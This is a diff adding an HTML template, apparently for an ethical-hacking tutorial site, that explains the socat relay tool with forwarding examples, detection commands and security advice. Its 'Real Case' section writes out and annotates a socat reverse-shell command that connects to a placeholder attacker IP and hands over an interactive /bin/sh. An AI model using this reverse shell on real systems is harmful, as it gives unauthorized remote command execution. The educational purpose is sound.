@@ -1,0 +1,115 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>What is socat?</title>
+  <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+  <h1>What is socat?</h1>
+
+  <p class="common">
+    <strong>socat</strong> (SOcket CAT) is a versatile command-line relay that forwards data between two arbitrary data channels (TCP, UDP, UNIX sockets, files, TTYs, stdio, etc.).  
+    It’s used for port forwarding, proxying, testing, and bridging different socket types on Linux/Unix systems.
+  </p>
+
+
+  <h1>Real Case</h1>
+  <div class="list">
+    <h2><code>./socat tcp-connect:&lt;YOUR_IP>:4444 exec:/bin/sh,pty,stderr,setsid,sigint,sane</code></h2>
+    <ul>
+        <li><code>./socat</code> — runs the socat binary from the current directory.</li>
+        <li><code>tcp-connect:&lt;YOUR_IP&gt;:4444</code> — open an outbound TCP connection to &lt;YOUR_IP&gt; on port 4444 (acts as a client connecting to a listener).</li>
+        <li><code>exec:/bin/sh</code> — execute the shell <code>/bin/sh</code>; socat connects the shell’s input/output to the network channel.</li>
+        <li><code>pty</code> — allocate a pseudo-TTY for the executed shell so the remote side receives an interactive terminal (enables line editing, control sequences, job control behavior).</li>
+        <li><code>stderr</code> — include the shell’s standard error in the forwarded stream so error output is visible to the remote side.</li>
+        <li><code>setsid</code> — start the shell in a new session (creates a separate process session for the child).</li>
+        <li><code>sigint</code> — allow SIGINT (Ctrl-C) to be delivered/forwarded to the child process, improving interactive control.</li>
+        <li><code>sane</code> — set the pseudo-TTY to "sane" terminal settings (reasonable defaults) so terminal input/output behaves correctly.</li>
+        <li><strong>Net effect:</strong> when this command runs and connects, the remote listener on &lt;YOUR_IP&gt;:4444 receives an interactive shell session from the host running socat.</li>
+        <li><strong>Security note:</strong> this effectively gives remote command execution on the host. Use only on systems you own or are explicitly authorized to administer. For legitimate remote access prefer SSH; monitor and restrict unexpected socat usage on production systems.</li>
+    </ul>
+  </div>
+
+  <div class="list">
+    <h3 class="blue">Why socat is useful</h3>
+    <ul>
+      <li>Bridge different address types (TCP↔UNIX, TCP↔TCP, STDIO↔socket) without writing code.</li>
+      <li>Quickly expose or forward services for admin/debugging, local testing, or temporary proxies.</li>
+      <li>Works with many options (reuseaddr, fork, SSL, pty) so it fits many network plumbing tasks.</li>
+    </ul>
+  </div>
+
+  <div class="list">
+    <h3 class="blue">Common, safe examples</h3>
+    <ul>
+      <li><strong>Forward local TCP port to remote web server:</strong>
+        <pre><code>socat TCP-LISTEN:8080,reuseaddr,fork TCP:10.0.0.5:80</code></pre>
+        Listen on localhost:8080 and forward connections to 10.0.0.5:80 (useful for testing).</li>
+
+      <li><strong>Expose a UNIX socket over TCP:</strong>
+        <pre><code>socat TCP-LISTEN:8080,reuseaddr,fork UNIX:/var/run/docker.sock</code></pre>
+        Bridge a localhost TCP port to a UNIX domain socket for local tooling (admin only).</li>
+
+      <li><strong>Connect two TCP endpoints (simple proxy):</strong>
+        <pre><code>socat TCP-LISTEN:9000,reuseaddr,fork TCP:internal.service:9000</code></pre>
+      </li>
+    </ul>
+  </div>
+
+  <div class="list">
+    <h3 class="blue">Detection & investigation</h3>
+    <ul>
+      <li>Look for running processes: <code>ps aux | grep socat</code>.</li>
+      <li>Inspect listening sockets: <code>ss -tulpn | grep socat</code> or <code>lsof -iTCP -sTCP:LISTEN</code>.</li>
+      <li>Audit unexpected network bridges or child processes (e.g., ptys/executables spawned by socat).</li>
+    </ul>
+  </div>
+
+  <div class="list">
+    <h3 class="blue">Security notes & best practices</h3>
+    <ul>
+      <li>Only run socat on systems you control or are authorized to manage.</li>
+      <li>Prefer binding to <code>127.0.0.1</code> when exposing services locally; avoid binding to 0.0.0.0 unless required.</li>
+      <li>Run with least privilege (avoid root if not necessary) and restrict access with firewall rules.</li>
+      <li>Enable logging and monitor for unexpected socat invocations; restrict write access to scripts that launch socat.</li>
+    </ul>
+  </div>
+
+  <div class="list">
+    <h3 class="blue">Quick commands (copy/paste)</h3>
+    <ul>
+      <li><strong>Show socat process + args:</strong>
+        <pre><code>ps -ef | grep '[s]ocat'</code></pre>
+      </li>
+      <li><strong>List listening sockets:</strong>
+        <pre><code>ss -tulpn | grep -E 'socat|LISTEN'</code></pre>
+      </li>
+      <li><strong>Test raw data transfer (local):</strong>
+        <pre><code># on one terminal
+socat -d -d TCP-LISTEN:12345,reuseaddr STDOUT
+# on another:
+printf 'hello\n' | socat - TCP:127.0.0.1:12345</code></pre>
+      </li>
+    </ul>
+  </div>
+
+  <div class="list">
+    <h3 class="blue">Limitations & gotchas</h3>
+    <ul>
+      <li>socat is low-level — it won’t provide application protocol handling (TLS termination, HTTP parsing) unless you add options or wrap with other tools.</li>
+      <li>Misuse can expose shells, internal services, or create covert tunnels — treat socat like a powerful plumbing tool and restrict its use.</li>
+      <li>Some builds require OpenSSL for TLS support; features vary by distro/package.</li>
+    </ul>
+  </div>
+
+  <div class="list">
+    <h3 class="blue">Short security reminder</h3>
+    <ul>
+      <li>When accepting files or scripts that start network plumbing (socat included), validate provenance and review command arguments before execution.</li>
+    </ul>
+  </div>
+</body>
+</html>
